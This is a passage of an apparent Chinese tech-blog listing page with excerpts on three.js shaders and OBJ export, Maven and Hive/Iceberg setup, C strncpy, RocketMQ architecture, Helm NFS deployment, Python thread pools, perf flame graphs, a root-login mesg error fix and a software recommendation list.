'https://img3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1ccd2441cdc5a9abd421ce1e36f70299/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/daf74309e71ac4ea162c9f0aa30e250e/" rel="bookmark">
			给物体添加自发光线框
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		export function makeOutlineLoop(points: THREE.Vector3[]) {
// 自发光材质
const material = new THREE.ShaderMaterial({
vertexShader: `
varying vec3 vPosition;
void main() {
vPosition = position;
gl_Position = projectionMatrix * modelViewMatrix * vec4(position, 1.0);
}
`,
fragmentShader: `
varying vec3 vPosition;
void main() {
float brightness = 1.0; // 自发光亮度调整
vec3 color = vec3(0.63, 0.63, 0.97); // 自发光颜色
gl_FragColor = vec4(color * brightness, 1.0);
}
`,
transparent: true,
depthTest: false,
depthWrite: false
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/daf74309e71ac4ea162c9f0aa30e250e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/13815c04d64a94d05fb9f9cac8919458/" rel="bookmark">
			threejs导出obj模型
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		async exportObj() {
await mFurnitureArray.forEach(async (el: any) =&gt; {
//转化为obj与mtl
let exporter = new OBJExporter();
let objData = exporter.parse(el.m_Object3D);
console.log(objData)
const objFileData = new Blob([objData], { type: 'text/plain' });
//下载文件
const a = document.createElement('a');
a.href = URL.createObjectURL(objFileData);
a.download = 'wall.obj';
a.click();
let model = el.m_Object3D;
let materials:any = [];
model.traverse(function (child: any) {
if (child.isMesh) {
// 获取子对象的材质
var material = child.material;
// 将材质添加到材质数组中
if (Array.isArray(material)) {
materials.push(...material);
} else {
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/13815c04d64a94d05fb9f9cac8919458/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/29c1e8529264c94bc5521e0ff0a952ea/" rel="bookmark">
			Caused by: java.lang.ClassNotFoundException: org.apache.maven.exception.ExceptionHandler 的解决办法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题概述 出现这个问题，是由于开发环境迁移，在迁移的过程中操作不规范导致的，
由一台开发服务器，迁移至另外一台开发服务器时，启动失败，
错误提示：“ Exception in thread "main" java.lang.NoClassDefFoundError: org/apache/maven/exception/ExceptionHandler ”
具体内容如下：
Exception in thread "main" java.lang.NoClassDefFoundError: org/apache/maven/exception/ExceptionHandler at java.base/java.lang.Class.getDeclaredMethods0(Native Method) at java.base/java.lang.Class.privateGetDeclaredMethods(Class.java:3166) at java.base/java.lang.Class.getMethodsRecursive(Class.java:3307) at java.base/java.lang.Class.getMethod0(Class.java:3293) at java.base/java.lang.Class.getMethod(Class.java:2106) at org.codehaus.plexus.classworlds.launcher.Launcher.getEnhancedMainMethod(Launcher.java:168) at org.codehaus.plexus.classworlds.launcher.Launcher.launchEnhanced(Launcher.java:261) at org.codehaus.plexus.classworlds.launcher.Launcher.launch(Launcher.java:225) at org.codehaus.plexus.classworlds.launcher.Launcher.mainWithExitCode(Launcher.java:406) at org.codehaus.plexus.classworlds.launcher.Launcher.main(Launcher.java:347) Caused by: java.lang.ClassNotFoundException: org.apache.maven.exception.ExceptionHandler at org.codehaus.plexus.classworlds.strategy.SelfFirstStrategy.loadClass(SelfFirstStrategy.java:50) at org.codehaus.plexus.classworlds.realm.ClassRealm.unsynchronizedLoadClass(ClassRealm.java:271) at org.codehaus.plexus.classworlds.realm.ClassRealm.loadClass(ClassRealm.java:247) at org.codehaus.plexus.classworlds.realm.ClassRealm.loadClass(ClassRealm.java:239) ... 10 more 如下图：
解决办法 关于这个问题，是因为 Maven 的lib包损坏导致的，很难找到是那个lib包，
倒腾了很久，解决了这个lib包，又会报下一个lib包异常，
遇到死胡同，蝴蝶效应产生了，
找不完那个lib包，最简单直接的办法：
就是重新安装maven，注意：保存.m2的repository仓库，和maven的settings.xml（因为这里里面可能你很多的私有仓库地址，和账号密钥等）
maven apache 最新版本下载地址：
[官网最新版本下载地址]
CSDN apache-maven-3.9.5-bin windows 64bit x86下载
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/29c1e8529264c94bc5521e0ff0a952ea/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a9183b34cb66be4c20c438e57d241e5d/" rel="bookmark">
			iceberg学习笔记（2）—— 与Hive集成
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前置知识：
1.了解hadoop基础知识，并能够搭建hadoop集群 2.了解hive基础知识
3.Iceberg学习笔记（1）—— 基础知识-CSDN博客
可以参考：
Hadoop基础入门（1）：框架概述及集群环境搭建_THE WHY的博客-CSDN博客
Hive基础知识总结-CSDN博客
环境准备 hive和iceberg的适配关系
Hive 版本
官方推荐Hive版本
Iceberg 版本
2.x
2.3.8
0.8.0-incubating – 1.1.0
3.x
3.1.2
0.10.0 – 1.1.0
注意：
Iceberg与Hive 2和Hive 3.1.2/3的集成，支持以下特性：
创建表删除表读取表插入表（INSERT into） 更多功能需要Hive 4.x（目前alpha版本）才能支持
hive与iceberg的环境搭建：
1.上传jar包到hive的路径下：
mkdir auxlib cp iceberg-hive-runtime-1.1.0.jar /opt/module/hive/auxlib cp libfb303-0.9.3.jar /opt/module/hive/auxlib auxlib文件夹通常用于存放一些用户自定义的jar包，比如UDF、UDAF函数等
在hive-site.xml中可以通过hive.aux.jars.path参数绑定auxlib文件夹的路径
2.修改hive-site.xml，添加配置项
&lt;property&gt; &lt;name&gt;iceberg.engine.hive.enabled&lt;/name&gt; &lt;value&gt;true&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;hive.aux.jars.path&lt;/name&gt; &lt;value&gt;/opt/module/apache-hive-3.1.2-bin/auxlib&lt;/value&gt; &lt;/property&gt; 开启iceberg支持以及绑定jar包依赖
如果hive需要使用Tez引擎，注意事项如下：
1.使用Hive版本&gt;=3.1.2，需要TEZ版本&gt;=0.10.1
2.在hive-site.xml中指定tez更新配置：
&lt;property&gt; &lt;name&gt;tez.mrreader.config.update.properties&lt;/name&gt; &lt;value&gt;hive.io.file.readcolumn.names,hive.io.file.readcolumn.ids&lt;/value&gt; &lt;/property&gt; 3.从Iceberg 0.11.0开始，如果Hive使用Tez引擎，需要关闭向量化执行 &lt;property&gt; &lt;name&gt;hive.vectorized.execution.enabled&lt;/name&gt; &lt;value&gt;false&lt;/value&gt; &lt;/property&gt; 有关Tez引擎：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a9183b34cb66be4c20c438e57d241e5d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9dea0b8246dfb21e22f170d1fc2b24a4/" rel="bookmark">
			【C语法学习】25 - strncpy()函数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1 函数原型2 参数3 返回值4 使用说明5 示例5.1 示例15.2 示例2 1 函数原型 strncpy()：将str指向的字符串的前n个字符拷贝至dest指向的内存空间中，函数原型如下：
char *strncpy(char *dest, const char *src, size_t n); 2 参数 strncpy()函数有三个参数src、dest和n：
参数src是指向待拷贝字符串的指针，类型为char*型；参数dest是指向拷贝目的地的指针，类型为char*型；参数n是拷贝的字符数量，类型为size_t(unsigned int)型。 3 返回值 strncpy()函数的返回值类型为char*型，返回值为dest。
4 使用说明 如果src指向的字符串长度小于n，strncpy()函数在拷贝字符串时连同字符串末尾的空字符’\0’一起拷贝，并在拷贝后的字符串末尾填充空字符’\0’，凑齐n个字符；如果src指向的字符串长度大于n，strncpy()函数在拷贝字符串时仅拷贝字符串的前n个字符，且不在拷贝后的字符串末尾添加空字符’\0’。 C语言标准描述如下：
1. Copies at most count characters of the character array pointed to by src (including the terminating null character, but not any of the characters that follow the null character) to character array pointed to by dest. 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9dea0b8246dfb21e22f170d1fc2b24a4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/54df83553d6c208374f634fe2e8346ea/" rel="bookmark">
			多位数组转化为一维数组
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		三种实现方式： 方式一：使用generator实现 function* flat(data) { for (let i = 0; i &lt; data.length; i++) { if (Array.isArray(data[i])) { yield* flat(data[i]) } else { yield data[i] } } } let data = [] for (let item of flat(a)) { data.push(item) } 方式二： 使用原生的方式 let data = [] function fn (a) { for (let i = 0; i &lt; a.length; i++) { if (Array.isArray(a[i])) { fn(a[i]) } else { data.push(a[i]) } } } fn(a) 方式三： 借助于数组的flat方法 data = a.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/54df83553d6c208374f634fe2e8346ea/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3c4be33ee622223acbdd54d758cadde1/" rel="bookmark">
			RocketMQ - 集群管理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在分布式服务架构中，任何中间件或者应用都不允许单点存在，服务发现机制是必备的。服务实例有多个，且数量是动态变化的。注册中心会提供服务管理能力，服务调用方在注册中心获取服务提供者的信息，从而进行远程调用。接下来介绍一下RocketMQ的整体架构设计、集群管理。
整体架构设计 首先介绍一下RocketMQ和Kafka的渊源， Kafka是一款高性能的消息中间件，经常在大数据场景中被使用，但由于Kafka不支持消费失败重试、定时消息、事务消息，顺序消息也有明显缺陷，难以支撑淘宝交易、订单、充值等复杂业务场景。淘宝中间件团队参考Kafka重新设计并用Java编写了RocketMQ，因此在RocketMQ中会有一些概念和Kafka相似。
常见的消息中间件Kafak、RabbitMQ、RocketMQ等都基于发布/订阅机制，消息发送者把消息发送到消息服务器，消息消费者从消息服务器订阅感兴趣的消息。这个过程中消息发送者和消息消费者是客户端，消息服务器是服务端，客户端与服务端双方都需要通过注册中心感知彼此。
RocketMQ部署架构主要分为四部分，如下图所示
Producer：消息发布的角色，主要负责把消息发送到Broker，支持分布式集群方式部署。Consumer：消息消费者的角色，主要负责从Broker订阅消息消费，支持分布式集群方式部署。Broker：消息存储的角色，主要负责消息的存储、投递和查询，以及服务高可用保证，支持分布式集群方式部署。NameServer：服务管理的角色，主要负责管理Broker集群的路由信息，支持分布式集群方式部署。 NameServer是一个非常简单的Topic路由注册中心，其角色类似于Dubbo中依赖的ZooKeeper，支持Broker的动态注册与发现。主要包含以下两个功能：
服务注册：NameServer接收Broker集群的注册信息，保存下来作为路由信息的基本数据，并提供心跳检测机制，检查Broker是否还存活。路由信息管理：NameServer保存了Broker集群的路由信息，用于提供给客户端查询Broker的队列信息。Producer和Consumer通过NameServer可以知道Broker集群的路由信息，从而进行消息的投递和消费。 基本概念 Message：消息，系统所传输信息的物理载体，生产和消费数据的最小单位，每条消息必须属于一个Topic，RocketMQ中每条消息拥有一个唯一的MessageID，并且可以携带具有业务表示的Key。Topic：主题，表示一类消息的集合，每个主题都包含若干条消息，每条消息都只能属于一个主题，Topic是RocketMQ进行消息订阅的基本单位。Queue：消息队列，组成Topic的最小单元，默认情况下一个Topic会对应多个Queue，Topic是逻辑概念，Queue是物理存储，在Consumer消费Topic消息时，底层实际则拉取Queue的消息。Tag：为消息设置的标志，用于同一主题下区分不同类型的消息。来自同一业务单元的消息，可以根据不同业务目的在同一主题下设置不同标签。标签能够有效地保持代码的清晰度和连贯性，并优化RocketMQ提供的查询系统。消费者可以根据Tag实现对不同子主题的不同消费的处理逻辑，实现更好的扩展性。UserProperties：用户自定义属性集合，属于Message的一部分。ProducerGroup：同一类Producer集合，这类Producer发送同一类消息且发送逻辑一致。如果发送的是事务消息且原始生产者在发送之后崩溃，则Broker服务器会联系同一生产者组的其它生产者实例提交或者回溯消费。ConsumerGroup：同一类Consumer的集合，这类Consumer通常消费同一类消息且消费逻辑一致。消费者组使得在消息消费方面，实现负载均衡和容错的目标变得非常容易。消费者组的消费者实例必须订阅完全相同的Topic。 为什么使用NameServer 在Kafka中的服务注册与发现通常是用ZooKeeper来完成的，RocketMQ早期也使用了ZooKeeper做集群管理，但后来放弃了转而使用自己开发的NameServer。
在Kafka中，Topic是逻辑概念，分区是物理概念。1个Topic可以设置多个分区，每个分区可以设置多个副本，即有一个Master分区、多个Slave分区。
比如，搭建3个Broker构成一个集群，创建一个Topic取名为TopicA，分区是3个，副本数是2个。在上图中part表示分区，M表示Master，S表示Slave。
在Kafka中消息只能发送到Master分区中，消息发送给Topic时会发送到具体某个分区。如果发送给part0就只会发送到Broker0这个实例中，再由Broker0同步到Broker1和Broker2中的part0的副本中；如果发送给part1的消息，就只会发送到Broker1这个实例中，再由Broker1同步到Broker0和Broker2中的part1的副本中。
在RocketMQ中，Topic也是逻辑概念，队列(Queue)是物理概念(对应Kafka中的分区)。1个Topic可以设置多个队列，每个队列也可以有多个副本，即有一个Master队列、多个Slave队列。
RocketMQ的部署拓扑图如下：
为了方便对比，同样创建一个Topic取名为TopicA，队列是3个，副本数也是2个，但构成Broker集群的实例有9个。
Kafka与RocketMQ两者在概念上相似，但又有明显的差异
在Kafka中，Master和Slave在同一台Broker机器上，Broker机器上有多个分区，每个分区的Master/Slave身份是在运行过程中选举出来的。Broker机器具有双重身份，既有Master分区，也有Slave分区。在RocketMQ中，Master和Slave不在同一台Broker机器上，每台Broker机器不是Master就是Slave，Broker的Master/Slave身份是在Broker的配置文件中预先定义好的，在Broker启动之前就已经决定了。 这个差异的影响在哪里呢？Kafka的Master/Slave需要通过ZooKeeper选举出来，而RocketMQ不需要。问题就在这个选举上，ZooKeeper具备选举功能，选举机制的原理就是少数服从多数，那么ZooKeeper的选举机制必须由ZooKeeper集群中的多个实例共同完成。ZooKeeper集群中的多个实例必须相互通信，如果实例数很多，网络通信就会变得非常复杂且低效。
NameServer的设计目标是让网络通信变的简单，从而使性能得到极大的提升。为了避免单点故障，NameServer也必须以集群的方式部署，但集群中各个实例之间相互不进行网络通信。NameServer是无状态的，可以任意部署多个实例。Broker向每一台NameServer注册自己的路由信息，因此每一个NameServer实例都保存一份完整的路由信息。NameServer与每台Broker机器保持长连接，每隔30s从路由注册表中将故障机器移除。NameServer为了降低实现的复杂度，并不会立即通知客户端的Producer和Consumer。
集群环境下实例很多，偶尔会出现各种各样的问题，以下几种场景需要思考：
当某个NameServer因宕机或者网络问题下线了，Broker如何同步路由信息？
由于Broker会连接NameServer集群的每一个实例，Broker仍然可以向其它NameServer同步路由信息，Producer和Consumer仍然可以动态感知Broker的路由信息。NameServer如果检测到Broker宕机，并没有立即通知Producer和Consumer，Producer将消息发送到故障的Broker怎么办？Consumer从Broker订阅消息失败怎么办？
RocketMQ为了简化NameServer的设计，这两个问题都是在客户端解决的，可以参考RocketMQ高可用相关的文章。由于NameServer集群中的实例相互不通信，在某个时间点不同NameServer实例保存的路由信息可能不一致。
这对发送消息和消费消息并不会有什么影响，原理和上一个问题是一样的，从这里可以看出NameServer是CAP种的AP架构。 彩蛋
点击下方链接，可以免费获取大量电子书资源
免费领取资源
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7bfde4a89b6366a0fda01248c6b0a2a0/" rel="bookmark">
			Helm部署NFS存储类nfs-subdir-external-provisioner
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 Helm部署NFS存储类nfs-subdir-external-provisioner 1.nfs-subdir-external-provisioner 镜像不容易下载 这里本地上传 这是我下载的压缩包
上传到linux 并解压
tar -zxvf k8s.gcr.io_sig-storage_nfs-subdir-external-provisioner_v4.0.2.tar.gz 加载镜像
sudo docker load &lt; nfs-subdir-external-provisioner.tar 2.镜像上传Harbor镜像托管 我们部署了Harbor作为镜像托管 所以这里要对镜像Tag 重命名一下
sudo docker tag k8s.gcr.io/sig-storage/nfs-subdir-external-provisioner:v4.0.2 172.25.130.53:80/common/nfs-subdir-external-provisioner:v4.0.2 然后上传到Harbor中方便下载
sudo docker push 172.25.130.53:80/common/nfs-subdir-external-provisioner:v4.0.2 3.Helm部署nfs-subdir-external-provisioner 查询Chart
下载指定的版本 这样方便版本控制
helm pull appstore/nfs-subdir-external-provisioner --version 4.0.9 修改values.yml
修改镜像地址
修改NFS服务器地址
回到目录 安装Chart
helm install nfs-subdir-external-provisioner nfs-subdir-external-provisioner/ 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f470b01d5680222025e61327b0a3343f/" rel="bookmark">
			Python 基础之线程池入门
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 Python 基础之线程池入门 代码示例 import threading import time from concurrent.futures import ThreadPoolExecutor # 创建线程池 threadpool = ThreadPoolExecutor(max_workers= 20) # 具体执行任务的方法 def test(i): print("&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; 线程名称：%s 方法参数：%s" %(threading.current_thread().name,i)) def do_thread(): for i in range(0,20): # 提交具体执行方法至线程池，返回 Future 对象 future_data = threadpool.submit(test,i) # 关闭线程池 threadpool.shutdown() if __name__ == '__main__': do_thread() 执行结果 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bf69753420e4f27505222d8217f25201/" rel="bookmark">
			生成perf flame性能分析图
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 flame svg图是一种用来可视化CPU的调用栈的图形，可以帮助分析程序的性能瓶颈。flame svg图的每一列代表一个CPU的采样点，每一行代表一个函数调用，颜色代表不同的函数或模块。flame svg图的高度表示CPU的利用率，宽度表示函数的执行时间。
要生成flame svg图，需要使用perf工具来收集CPU的调用栈信息。perf是一款Linux内核自带的性能分析工具，可以用来监控和分析各种硬件和软件的事件。perf可以通过命令行的方式，指定要监控的进程、事件、时间和频率等参数。例如，以下命令可以用来监控一个名为myapp的进程的CPU周期事件，每秒采样1000次，持续10秒：
perf record -F 1000 -p $(pidof myapp) -g -o perf.data -- sleep 10 perf会将采样的数据保存在perf.data文件中，这个文件可以用perf script命令来转换为文本格式。例如，以下命令可以用来将perf.data文件转换为stackcollapse-perf格式的文本，并保存在stacks.out文件中：
perf script -i perf.data | stackcollapse-perf.pl &gt; stacks.out stackcollapse-perf.pl是一个Perl脚本，可以用来将perf script的输出转换为一种适合生成flame svg图的格式。这个脚本可以在以下网址下载。
最后，可以使用flamegraph.pl脚本来将stacks.out文件转换为flame svg图，并保存在flame.svg文件中。flamegraph.pl也是一个Perl脚本，可以用来生成flame svg图的SVG文件。这个脚本也可以在以下网址下载。例如，以下命令可以用来生成flame svg图：
flamegraph.pl stacks.out &gt; flame.svg 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/71ac2c31983d8bfbbbbf0ee8c633bea3/" rel="bookmark">
			Threejs_06 多材质的实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Threejs 同一个几何体如何实现多材质呢？
多材质的实现 1.使用索引绘制一个几何体 //创建几何体(三角形) const geometry = new THREE.BufferGeometry(); //使用索引绘制 (两个共用的) const vertices = new Float32Array([ -1.0, -1.0, 0.0, 1.0, -1.0, 0.0, 1.0, 1.0, 0.0, -1.0, 1.0, 0, ]); //创建顶点属性 geometry.setAttribute("position", new THREE.BufferAttribute(vertices, 3)); //创建索引 const indices = new Uint16Array([0, 1, 2, 2, 3, 0]); //创建索引属性 geometry.setIndex(new THREE.BufferAttribute(indices, 1)); 2. 设置顶点组(为了方便应用材质) // 设置2个顶点组 形成两个材质 顶点0开始 添加3个顶点 用的是第一个材质(第三个参数) geometry.addGroup(0, 3, 0); geometry.addGroup(3, 3, 1); //顶点3开始 添加三个顶点 第二个材质 3.创建两个材质 //创建材质 const material = new THREE.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/71ac2c31983d8bfbbbbf0ee8c633bea3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1240a29b575227f9fa2690d5aaeb3dfb/" rel="bookmark">
			小小发票拦住出海“巨头”，合合信息智能文档处理技术助力企业重塑财务管理流程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		作为连接企业采购、生产、运营、销售等经营行为的枢纽，财务系统的数字化、智能化升级近年来变得愈发重要。发票的录入、存储关乎企业应收账款管理和税务规范，通过技术手段提升发票管理的精准度与效率，也成为了财务数字化的关键环节。
近日，合合信息智能票据产品TextPro正式上线中国某知名新能源车企的国际财务共享中心，将通过AI技术解决该企业在横跨欧洲7国的经营版图中，存在的多语种、多票种、低效率等票据处理痛点。
“小票”拦住出海“巨头”，智能文档处理技术破解难题
据悉，该车企在全球范围内有3000余家供应商，长期被来自欧洲多个国家非固定版式的海量发票所困扰。“巨头”被“小票”拦路并非个例。乘势数字化机遇，近年来中国企业出海步伐不断加速，票据管理工作也在与国际市场的接轨中经历着挑战。由于各业务线票据版式不同、多语言识别不清，业务人员手工录入流程繁琐易出错，票据存档方式复杂，财务中心人员对多国会计准则不一等多种原因，票据管理的数字化之路面临着重重坎坷。
基于智能文档处理技术，合合信息智能票据产品帮助该企业解决了以上痛点。基于深度学习的方法，合合信息提供的智能处理解决方案，让计算机可以更好地模拟人眼和大脑去识别各类票据，实现对多语言、多版式、多类型的会计凭证识别结构化信息提取；面对客户的海外供应商上传的各类发票，智能票据产品可提供多语言发票的“开箱式”智能识别服务，减轻财务票据处理压力。
目前，该新能源车企财务共享中心仅需安排3位工作人员，便可完成来自欧洲7国的发票审核。在节省时间和人力资源的同时，企业也实现了从发票创建、识别和数据验证、错误纠正、发送数据影像到后续持续优化的票据处理全流程自动化管理，让票据辨识不再依赖个人经验，提升数据规范性和过账标准一致性。
财务共享中心“建设潮”背后，企业财务管理流程正被重塑
财务共享中心可将原本低效率高重复的流程统一集中处理，通过标准化作业，减少人为差错，降低业务成本，提高各部门的工作效率。因此，集团企业通过建设财务共享中心，对企业原有的财务流程进行重塑的动作越来越普遍。
某世界500强集团的财务共享中心负责集团下属所有二级集团及子公司的财务工作。因各业务线需要录入、识别、验真的凭证种类繁多，审核工作量极大。单从凭证类型统计，该集团子公司申请付款时，需要向集团财务共享中心提交的凭证包便包括：完税证明、银行回单、采购合同、付款合同、收款合同、销售合同、发票、销货清单、验收单、结算单、银行承兑汇票等材料，票据审核工作量极大，仅审核岗员工就超过了200名。
为了加强财务管控、减轻财务风险，该集团与合合信息合作共建了财务共享中心。合合信息智能文档处理技术可有效解决图像质量低、文档版式多样、手写字体识别、表格识别等图像处理传统难点，对多版式文档的文字、表格、印章、签字等审核项信息进行精准识别与抽取，帮助该集团对多种凭证进行文字检测、识别与关键信息抽取，实现审核字段的自动提取、信息一致性校验，减轻人工审核工作量，提升凭证审核效率。
财务共享中心“建设潮”的现象，反映了企业财务管理流程从“组织和流程驱动”到“人工智能和数据驱动”的演进趋势。合合信息将持续依托前沿技术，推进企业财务数字化转型升级进程。据悉，合合信息智能解决方案已在金融、政务、制造、物流等30个行业落地，服务的世界500强公司超过125家。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3b6783067c405c5a55d3067217268ada/" rel="bookmark">
			mesg:ttyname failed: Inappropriate ioctl for device 对设备不适当的ioctl操作
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、问题 给ubuntu、kylin（麒麟）等系统登录界面加上手动输入用户名和密码的登录选项，使用用户名root登录后， 弹出如下提示框。
二、解决办法 编辑配置文件
vi /root/.profile 把
mesg n || true 修改为
tty -s &amp;&amp; mesg n || true 即可。
三、原因 ubuntu、kylin（麒麟）等系统的设计理念就是尽量避免直接用root账户进行操作。因此，当有人尝试使用root账户直接登录，便会发出图中的错误信息。实际上，这个错误本身不会影响系统的运行，将如上的窗口关闭后，系统还是能够正常的进入图形界面，一切操作都能继续。解决方法最大的作用就是将这个错误信息关掉。
图中的提示框已经告诉我们，错误产生自命令mesg。对比~/.profile和/root/.profile这两个文件，可以发现只有后者执行了mesg。我试着在~./profile文件末尾也加上mesg n || true。结果，发现普通用户登录后也会报图中的错误。mesg n 报错的原因是，在进入图形界面之前，当前会话中并没有TTY设备，消息无处显示，便会报错。
所以，真正的原因总结如下：为了提醒用户不要尝试直接登录root账户，利用mesg命令的特性，在/root/.profile中加入了mesg n || true。解决方法的思想就是，在没有tty设备时，不继续执行命令mesg。所以报错信息也消掉了。
参考：linux - Xubuntu 16.04 ttyname failed Inappropriate ioctl for device - Super User
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4c8e25865ce69723f93b812e20267a28/" rel="bookmark">
			【软件推荐】我的常用Windows软件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言软件安装习惯Colors Lite（颜色吸取）Everything（文件搜索）知云文献翻译Directory Opus（文件管理器）Snipaste（截图）AxMath（公式编辑器）Deskpin（窗口固定）Hayo（AI）剪映（视频剪辑）OBS（录屏）PotPlayer（视频播放器）Todesk（远程控制）Typora（Markdown文件编辑器）飞书（构建知识库）Xmind（思维导图）QuickLook（快速查看、微软商店下载）Twinke Tray:Brightness Slider（亮度调节）火绒（垃圾清理、广告拦截、应用自启动管理）亿图图示（画图软件）IDEA（Java IDE）WebStorm（前端开发）Xshell、Xftp（远程服务器连接）Postman（模拟请求发送）JMeter（压力测试）HbuilderX、微信开发者工具（小程序）Navicat（数据库管理软件）Docker（容器管理）Git（版本控制）QuickRedis（查看Redis的数据）ShareMouse（一套键鼠控制多台电脑）GifCam（录制Gif动图）Utools 前言 作为一个成熟的学生 打工人，肯定不能缺少一些能够大大提升我学习 工作效率的神仙软件，这么多年来，我已经积累了不少实用软件，在这里通通分享给大家
软件安装习惯 我在安装软件时会分成两个文件夹，一个是日常软件安装文件夹，一个是开发环境安装文件夹。
我还会将给所有软件都分别创建一个文件夹进行管理，这样后面需要找安装包发给别人也比较方便
对于每个软件，我会创建两个文件夹，一个用来存储软件的安装包，另一个作为软件的安装路径
Colors Lite（颜色吸取） 在写前端页面的时候，有时候需要经常参考其他网站的色系，这时候就可以使用颜色吸取软件来吸取想要获取的颜色，这样就可以得到RGB、十六进制颜色等等
吸取颜色
颜色吸取成功
Everything（文件搜索） 这个软件可以快速根据名字从所有盘中搜索到想要的文件
知云文献翻译 这个软件可以快速根据鼠标所选中的英文句子翻译出其中文意思，对于我这种英语学渣实在是太友好了
Directory Opus（文件管理器） 对于我来说，这个文件管理器最大的优点是可以将常用的文件夹收藏起来，这样在寻找文件的时候可以快速打开想要打开的文件夹
Snipaste（截图） 该软件可以很方便地进行截图，截出来的图可以悬挂在电脑上（这个功能非常适用于将截图的内容作为参照），除此之外，对图片进行标记也非常方便，因此这个功能非常适合进行网课学习
AxMath（公式编辑器） 这个编辑器可以植入到Word文档中，还可以根据公式逆转出其Latex代码
Deskpin（窗口固定） 这个软件可以将窗口固定住在最上层，所被固定的窗口不会因为点击屏幕或者其他软件而被缩小到状态栏中或者被其他软件所遮挡
Hayo（AI） 使用该软件可以非常便捷地让AI帮助你干活，还可以切换成不同的大语言模型
剪映（视频剪辑） 因为我不是专业的视频剪辑工作者，只是在很少时间需要使用到视频剪辑功能，剪映可以非常方便地根据声音来生成字幕，还可以根据字母来生成音频（这个功能简直是我广东普通话的救星）
OBS（录屏） 这个软件不仅免费，还可以任意框定录屏区域、设置视频的格式和画质
PotPlayer（视频播放器） 支持多种格式的视频播放
Todesk（远程控制） 该软件可以让你很流畅地控制另一台电脑，在帮助别人远程解决问题的时候非常方便，就是不开会员的话，画质比较差（这不是软件的问题，是我的问题，谁让我穷呢）
Typora（Markdown文件编辑器） 使用该软件可以很方便地编辑md文件，实在是做笔记必备软件，还支持导入大佬所开发地主题，让笔记变成你爱看的模样
在编辑文章时，图片默认会被放到一个文件目录下面，这样后面进行文档迁移或者将文档发给别人都不方便，建议向我一样设置
当向上面一样设置之后，文档对应的文件会被放到一个图片文件夹中，后面需要迁移文档或者将文档分享给小伙伴，只需要同时拷贝md文件和其对应的assets文件夹即可
飞书（构建知识库） 该网站的文档支持md语法，非常使用用来做笔记，还可以实时同步，不同设备可以同时编辑和查看相同的文件
Xmind（思维导图） 该软件可以非常方便地辅助你创建思维导图，只需要简单地按下快捷键就可以创建分支，还提供多种美观地思维导图样式
QuickLook（快速查看、微软商店下载） 安装该软件之后，可以按下空格键来快速预览文件，例如图片、视频，这样速度比较快
Twinke Tray:Brightness Slider（亮度调节） 有时候不同显示器的亮度不太一样，只是靠电脑来调节亮度调节，有的暗、有的亮，实在是太难受，该软件支持针对不同的显示器来调节不同的亮度，可以很好地保护眼睛
火绒（垃圾清理、广告拦截、应用自启动管理） 自从用了火绒之后，妈妈再也不用担心我的电脑出现广告弹窗了，相比于360，这个软件不会捆绑其他软件，但是杀毒能力也有所欠缺
亿图图示（画图软件） 亿图图示提供非常多的绘图模板，实在是大作业必备的好软件
